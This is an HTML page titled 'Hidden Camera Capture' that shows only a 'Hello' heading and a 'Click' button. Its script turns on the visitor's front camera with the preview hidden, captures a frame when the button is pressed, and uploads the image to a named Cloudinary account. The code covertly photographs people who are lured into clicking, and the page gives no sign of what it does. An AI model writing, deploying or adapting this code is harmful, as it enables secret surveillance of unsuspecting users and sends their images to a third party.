<!DOCTYPE html>
<html>
<head>
  <title>Hidden Camera Capture</title>
</head>
<body>
  <h2>ðŸ“¤ Hello</h2>

  <button onclick="takePhoto()">Click</button>

  <!-- Hidden video element (camera preview) -->
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    // âœ… Start camera silently (without showing preview)
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        video.srcObject = stream;
      })
      .catch(err => {
        alert("Camera permission required.\n\n" + err);
      });

    // âœ… Capture photo on 1 tap
    async function takePhoto() {
      // Create capture canvas
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);

      // Convert to base64
      const base64Image = canvas.toDataURL("image/jpeg");

      // Upload to Cloudinary
      const formData = new FormData();
      formData.append("file", base64Image);
      formData.append("upload_preset", "photo_upload");

      const res = await fetch("https://api.cloudinary.com/v1_1/rajeevoberai39/image/upload", {
        method: "POST",
        body: formData
      });

      const data = await res.json();
      console.log("âœ… Uploaded:", data.secure_url);
    }
  </script>
</body>
</html>
